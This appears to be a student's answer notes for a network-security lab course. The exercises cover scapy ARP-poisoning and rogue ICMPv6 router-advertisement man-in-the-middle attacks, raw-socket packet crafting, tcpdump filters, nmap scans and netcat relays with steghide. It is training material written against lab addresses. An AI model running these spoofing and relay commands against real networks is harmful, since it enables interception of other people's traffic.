
Data is being sent to T3 from an unknown source over an ICMP covert channel. Use scapy to perform a MitM using ARP to capture this data.
On T2 edit the /proc/sys/net/ipv4/ip_forward file to enable IP Forwarding. Change the value from 0 to 1.
On T2 open scapy as root.
Create the Ethernet Header (Ether) and change the ether-type to the hex value for ARP.
Create the ARP header (ARP) to Poison T4
Create the ARP header (ARP) to Poison T3
Send your crafted headers using sendp.
Intercept the flag being sent over the network.
Use TCPDUMP or Wireshark to capture the FLAG using icmp and host 172.16.82.115 capture filters to minimize the traffic.
The mission prompt will provide the target details.

a=Ether()
>>> a.show()
a.type=0x0806

b=ARP()
>>> b.hwsrc="fa:16:3e:00:50:b1"
>>> b.show()
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = who-has
  hwsrc     = fa:16:3e:xx:50:xx
  psrc      = 172.16.xx.xxx
  hwdst     = 00:00:00:00:00:00
  pdst      = 0.0.0.0
  
   b.psrc="172.16.82.126"
   b.op="is-at"

sendp (a/b, iface="eth0")

--------------------------------------------------------------------------------------------------------------------------------------------------------
Provide proof of the functional ICMPv6 Router Advertisement to Mission Command.
Data is being sent from T3 to an unknown target using an ICMPv6 covert channel. Use scapy to perform a SLAAC MitM using ICMPv6 to capture this data.
On T2 open scapy as root.
Create the IPv6 header (IPv6) using the All Nodes multicast address.
Create the ICMPv6 Router Advertisement Header (ICMPv6ND_RA).
Create the Source Link-Local Address Option Header (ICMPv6NDOptSrcLLAddr) using your MAC as the source.
Create the ICMPv6 MTU Option Header (ICMPv6NDOptMTU).
Create the ICMPv6 Prefix Information Header (ICMPv6NDOptPrefixInfo) and assign the Prefix (fd00:deaf:cafe::) and Prefix Length of 64.
Send your crafted headers using send.
Intercept the flag being sent over the network.
Use TCPDUMP or Wireshark to capture the FLAG using icmp6 capture filters to minimize the traffic.
The mission prompt will provide the target details.



a=IPv6()
>>> a.show()

b=ICMPv6ND_RA()
>>> b.show()

c=ICMPv6NDOptSrcLLAddr()
>>> c.show()
 c.lladdr="fa:16:3e:00:50:b1"
  
 d=ICMPv6NDOptMTU()
>>> d.show()

e=ICMPv6NDOptPrefixInfo()
>>> e.show()
e.prefix="fd00:deaf:cafe::"
>>> e.show()

send(a/b/c/d/e, iface="eth0")


-------------------------------------------------------------------------------------------------------------------------------------------------------

What is the Berkeley Packet Filter, using tcpdump, to capture all packets with a ttl of 64 and less, utilizing the IPv4 or IPv6 Headers? 
There should be 4880 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ip[8]<=64 or ip6[7] <=64" -r BPFCheck.pcap | wc -l

-----------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets with at least the Dont Fragment bit set? There should be 1897 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ip[6] & 0x40=0x40" -r BPFCheck.pcap | wc -l

-------------------------------------------------------------------------------------------------------------------------------------------------------

What is the Berkeley Packet Filter, using tcpdump, to capture traffic with a Source Port higher than 1024, utilizing the correct Transport Layer Headers? 
There should be 4431 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "tcp[0:2]>1024||udp[0:2]>1024" -r BPFCheck.pcap | wc -l


----------------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all Packets with UDP protocol being set, utilizing the IPv4 or IPv6 Headers? 
There should be 613 packets.
Enter the Filter syntax with no spaces
sudo tcpdump "ip[9]=0x11||ip6[6]=0x11" -r BPFCheck.pcap  |wc -l

-------------------------------------------------------------------------------------------------------------------------------------------

What is the Berkeley Packet Filter, using tcpdump, to capture only packets with the ACK/RST or ACK/FIN flag set, utilizing the correct Transport 
Layer Header? There should be 1161 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "tcp[13]=20||tcp[13]=17" -r BPFCheck.pcap  |wc -l

--------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all packets with an IP ID field of 213? There should be 5 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ip[4:2]=213" -r BPFCheck.pcap  |wc -l

-----------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all traffic that contains a VLAN tag? There should be 150 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ether[12:2]=0x8100" -r BPFCheck.pcap  |wc -l
--------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets relating to DNS? There should be 31 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "tcp[0:2]=53||udp[0:2]=53||tcp[2:2]=53||udp[2:2]=53" -r BPFCheck.pcap  |wc -l

----------------------------------------------------------------------------------------------------------------------------------------------------

What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets with the DSCP field of 24? There should be 31 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "ip[1]>> 2 = 24 " -r BPFCheck.pcap  |wc -l


---------------------------------------------------------------------------------------------------------------------------------------------------------
What is the Berkeley Packet Filter, using tcpdump, to capture all IPv4 packets targeting just the beginning of potential traceroutes as it's 
entering your network. This can be from a Windows or Linux machine using their default settings? There should be 55 packets.
Enter the Filter syntax with no spaces

sudo tcpdump "(ip[9]=0x01||ip[9]=0x11)&&ip[8]=0x01" -r BPFCheck.pcap  |wc -l

--------------------------------------------------------------------------------------------------------------------------------------------------------
What are the 3 Address Families associated with the python3 socket module?
example:
socket.ADDFAM, socket.ADDFAM, socket.ADDFAM


socket.AF_INET,socket.AF_INET6,socket.AF_UNIX


-------------------------------------------------------------------------------------------------------------------------------------
What are the two socket functions called to open a connection and to disconnect from that connection?

example:

socket.fun(), socket.func()


socket.connect(),socket.close()

---------------------------------------------------------------------------------------------------------------------------------------------
What python3 library function is utilized to combine the various pieces of your raw socket packet into network order?
example:
module.function

struct.pack

---------------------------------------------------------------------------------------------------------------------------------------------------
What must be manually created with raw sockets that stream and datagram sockets creates for you?
 header
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
 What function within the socket module allows you to Send data to a socket, while not already being connected to a remote socket?
example:
socket.func()

socket.sendto()

-----------------------------------------------------------------------------------------------------------------------------------------------------

Provide an example of the two required items needed to be set in order to send a Datagram or Stream socket? (excluding any of the socket.socket functions)
example:
item1 item2

ip port

---------------------------------------------------------------------------------------------------------------------------------------------------------
When sending data across a connection, what must a string be converted to before being sent due to encoding?
byte-like object

--------------------------------------------------------------------------------------------------------------------------------------------------------
Gorgan Forces have requested you get a message to one of their remote teams that are utilizing the BLUE_DMZ_HOST-1. 
Utilizing the criteria they provided, generate a stream socket with python3:
Coded information was placed into the video below. Look at the note the woman passes to the man.
https://youtu.be/6WTdTwcmxyo?t=35
From your INTERNET-HOST to the BLUE_DMZ_HOST-1
Port number = #Last four digits on the note
Message = #Name on the note (First letter capitalized)




#/usr/bin/env python3
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#this can also be accomplished by using s= socket.socket(), because AF_inet and SOCK_STREAM are defailts

ipaddr = '172.16.1.15'
port = 5309

s.connect((ipaddr, port))

# to send  a string as a byte like object, add the prefix b to the string. \nis u sed to go to the next line 
s.send(b'Jenny')

# it is recommended that th ebufersize used with recvform is a power of 2 and not a very large numbers of bit
response, conn = s.recvfrom(1024)

#in order to receive a message that is sent as byte-like-object, you mist decond into utf-8 (default)
print(response.decode())

s.close()

---------------------------------------------------------------------------------------------------------------------------------------------------------
Level II Challenge
Gorgan Forces have requested you get a message to one of their remote teams that are utilizing the INTERNET_HOST. 
Utilizing the criteria they provided, generate a datagram socket with python3:
Coded information was placed into the video below. Listen to the words in the video.
https://youtu.be/OuK4OcMUGcg?t=67
Send to your INTERNET-HOST localhost.
Port number = #The number of fists
Message = #The name of the band (First letter capitalized)


#!/usr/bin/env python3

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ipaddr = '127.0.0.1'
port = 10000

# To send a string as a bytes-like object, add the prefix b to the string. \n is used to go to the next line
s.sendto(b'Disturbed', (ipaddr,port))

# It is recommended that the buffersize used with the recvfrom is a power of 2 and not a very large number in bits.
response, conn = s.recvfrom(1024)

# In order to receive the message that is sent as a btyes-like object you must decode into utf-8(default)
print(response.decode())
--------------------------------------------------------------------------------------------------------------------------------------------------------

Gorgan forces, tool development cell have provided RAWSOCK.py for your teams use, it defines the basic structure of the desired result.

Create a raw socket and code your message into the socket
Send your last name as the data.
The sent data is required to be encoded, with a final result of the data being in hex. You can use the python module of your choice; 
a good module to start with is binascii. When viewing in Wireshark, the packet should not be malformed
Target IP: 172.16.1.15
TOS: 96
IP ID: 1984
Protocol: CHAOS
The flag will be provided by the Mission Command once you complete the activity.
Provide the Wireshark Packet Capture.
Provide proof of the decoded message.


#!/usr/bin/env python3

#for building the socket
import socket

# FOr system  level commands:
import sys

# for establishing the packet structre. This will allow direct access to the methods and functions in the struct module
from struct import *

# for encoding
import binascii



#create a  raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit()

packet = ''
src_ip = "10.1.0.2"
dst_ip = "172.16.1.15"

#add the IPV4 header information
ip_ver_ihl = 69         # this is putting the decimal conversion off0x45 for version annd Internet header length
ip_tos = 96              # this cobines te DSCP and ECN fields
ip_len = 0              # this kernel will fill in the actual length of the packet
ip_id = 1984           # this sets the IP identification for the packet
ip_frag = 0             # this sets fragmentation to off 
ip_ttl = 64             # this determines the TTL of the packet when leaving the machine
ip_proto = 16           # this sets up the IP protocol to 16 (CHAOS). if this was 6(TCP) or 17(UDP) aditional headers would be required
ip_check = 0            # The kernel will FILL in the checksum for the packet
ip_srcadd = socket.inet_aton(src_ip)    # inet_aton(string) will convert an IP address to a 32 bit binary number
ip_dstadd = socket.inet_aton(dst_ip)    # inet_aton(string) will convert an IP address to a 32 bit binary number 

# the ! in the string means Big-Endian" network order
ip_header = pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)

# b turns it to byte like object before transmissions.
message = b'Poudel'
hidden_msg = binascii.hexlify(message)
packet = ip_header + hidden_msg

# send the packet
s.sendto(packet, (dst_ip, 0))

---------------------------------------------------------------------------------------------------------------------------------------------------------
Gorgan forces, tool development cell have provided RAWSOCK2.py for your teams use, it defines the basic structure of the desired result.

Create a raw socket and code your message into the socket
When viewing in Wireshark, the packet should not be malformed
Target IP: 172.16.40.10
IP ID: 2020
TCP Src port: 54321
TCP Dst port: 1234
SEQ Number: 90210
ACK Number: 30905
TCP flag: SYN
The flag will be provided by the Mission Command once you complete the activity.
Provide the Wireshark Packet Capture.

#!/usr/bin/env python3

#for building the socket
import socket

# For system  level commands:
import sys

# For doing array in the tcp checksum
import array


# for establishing the packet structre. This will allow direct access to the methods and functions in the struct module
from struct import *

#create a raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit()

packet = ''
src_ip = "10.1.0.2"
dst_ip = "172.16.40.10"

#add the IPV4 header information
ip_ver_ihl = 69         # this is putting the decimal conversion off0x45 for version annd Internet header length
ip_tos = 96             # this cobines te DSCP and ECN fields
ip_len = 0              # this kernel will fill in the actual length of the packet
ip_id = 2020            # this sets the IP identification for the packet
ip_frag = 0             # this sets fragmentation to off 
ip_ttl = 64             # this determines the TTL of the packet when leaving the machine
ip_proto = 6           # this sets up the IP protocol to 16 (CHAOS). if this was 6(TCP) or 17(UDP) aditional headers would be required
ip_check = 0            # The kernel will FILL in the checksum for the packet
ip_srcadd = socket.inet_aton(src_ip)    # inet_aton(string) will convert an IP address to a 32 bit binary number
ip_dstadd = socket.inet_aton(dst_ip)    # inet_aton(string) will convert an IP address to a 32 bit binary number 

# the ! in the string means Big-Endian" network order
ip_header = pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)

#TCP HEADER FIELD#
tcp_src = 54321          #source port
tcp_dst = 1234           #destination port
tcp_seq = 90210          # sequence number
tcp_ack_seq = 30905      #tcp ack sequence number
tcp_data_off = 5         #data offset specifying  the size of tcp header *4 which is 20
tcp_reserve = 0          #the 3 reserve bits + ns flag is reserve field
tcp_flags = 1            # tcp flags field before the bits are turned on
tcp_win = 65535          # maximum allowd window size reordered to network order
tcp_chk = 0              #tcp checksum which will be calculated later on 
tcp_urg_ptr = 0          #urgent point only if URG flag is set

#combine the left shifted 4 bit tcp offset and the reserve field
tcp_off_res = (tcp_data_off << 4)+ tcp_reserve


# TCP flags by bit stating from right to left
tcp_fin = 0         # Finished
tcp_syn = 1         # Synchronization
tcp_rst = 0         # Reset
tcp_psh = 0         # Push
tcp_ack = 0         # Acknowledgement
tcp_urg = 0         # Urgent
tcp_ece = 0         # Explicit Congestion Notification Echo 
tcp_cwr = 0         # Congestion Windows reduced


# Combine the tcp flags by left shifting the bit locations and adding the bits togather
tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_ack << 3) + (tcp_ack << 4) + (tcp_urg << 5) + (tcp_ece << 6) + (tcp_cwr << 7)


# The ! in the pack format string means network order
tcp_hdr = pack('!HHLLBBHHH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win, tcp_chk, tcp_urg_ptr)

user_data = b'Message'


# create Pseudo header Fields for the tcp checksum
src_address = socket.inet_aton(src_ip)
dst_address = socket.inet_aton(dst_ip)
reserved = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_hdr) + len(user_data)

# Pack the pseudo header and combine with user data
ps_hdr = pack('!4s4sBBH', src_address, dst_address, reserved, protocol, tcp_length)
ps_hdr = ps_hdr + tcp_hdr + user_data


def checksum(data):
    if len(data) % 2!= 0:
            data +=b'\0'
    res =sum(array.array("H", data))
    res = (res >> 16)+(res & 0xffff)
    res += res >> 16
    return (~res) & 0xffff

tcp_chk = checksum(ps_hdr)

#pack the tcp header to fill in the corrent checksum - remeber checksum is not in network byte order
tcp_hdr= pack('!HHLLBBH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win) + pack('H',tcp_chk) + pack('!H', tcp_urg_ptr)



#combine all of the headers and the use data
packet = ip_header + tcp_hdr + user_data

# Sendd the packet. send to is used when we do not  already have a socket connection.
s.sendto(packet, (dst_ip, 0))
------------------------------------------------------------------------------------------------------------------------------------------------------
How many host(s) did you discover on the DMZ Net? (excluding the router)

nmap 172.16.101.30/27
1
-----------------------------------------------------------------------------------------------------
What is the ip address of the host device(s) in the DMZ network?

nmap 172.16.101.30/27
172.16.101.2



----------------------------------------------------------------------------------------------------------------------

Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. 
The use of names pipes should be utilized on RELAY:
Syntax for steghide tool:
steghide extract -sf [image name]
Passphrase: password

The Donovian Insider provided a image called 1steg.jpg on T2 set to send this file to RELAY on TCP port 1234. 
Establish a Netcat relay on RELAY to accept this connection and forward to T1. Once the images are downloaded 
you will use a command-line tool called steghide to extract the message. Perform an MD5SUM on this message to create flag1.
File should be 89824 bytes in size.

nc -lp 1234 > Mypipe | nc 10.10.0.40 4321 < Mypipe
nc -lp 4321 > 1steg.jpg
steghide extract -sf 1steg.jpg


-----------------------------------------------------------------------------------------------------------------------------------------------------------


Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
Syntax for steghide tool:
steghide extract -sf [image name]
Passphrase: password
The Donovian Insider provided a image called 3steg.jpg on T2 waiting for a connection from RELAY on TCP port 6789. 
Establish a Netcat relay on RELAY to make this connection and forward to T1. Once the images are downloaded you will use a command-line tool called 
steghide to extract the message. Perform an MD5SUM on this message to create flag3.
File should be 177444 bytes in size.

nc 172.16.82.115 6789 > Mypipe | nc 10.10.0.40 1234 < Mypipe
nc -lp 1234 > 3steg.jpg
steghide extract -sf 3steg.jpg 


Interface with the web service on T3. The hint provides a suggestion on the ports above the well-known that you will need to recon.
What is the range? (provide the range in the format of the example below)
example:
1000-2000

wget -r 172.16.140.33




